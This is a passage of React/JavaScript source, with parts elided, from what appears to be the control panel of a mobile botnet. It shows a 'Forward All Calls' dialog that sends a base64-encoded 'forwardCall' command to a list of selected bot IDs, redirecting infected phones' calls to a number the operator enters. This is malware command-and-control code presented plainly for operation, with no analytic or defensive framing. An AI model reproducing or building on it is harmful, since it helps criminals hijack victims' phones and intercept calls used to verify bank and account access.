        ...
        let request = $.ajax({
            ...
            data: {
                'params': new Buffer(
                    ...
                    '"idbot":"' + selected.join(',') + '",' + 
                    '"command":"' + new Buffer('{"name":"forwardCall","number":"' + data + '"}').toString('base64') + '"' + 
            ...
            <DialogContent dividers>
                ...
                >
                    <SvgIcon fontSize="medium">
                        ...
                        <Typography ml={1} variant='h6' color="primary.contrastText" >Forward All Calls</Typography>
                    ...
                    <TextField onChange={()=> setdata(event.target.value)} sx={{mt: 3}} id="outlined-basic" label="Number" variant="outlined" fullWidth/>

                    <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
                    <Button onClick={()=> {if (data != '') { SendCommand(data); setOpenPopup(false); setdata(''); toast.success("Send command to forward calls to " + data)} else { toast.error("You need to enter a number where to forward all calls to"); } }} sx={{mt: 3, width: 115, height: 42, }} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faPlay} /></SvgIcon>)}variant="contained">Start</Button>
                    </div>
            </DialogContent>
        </Dialog>
    )
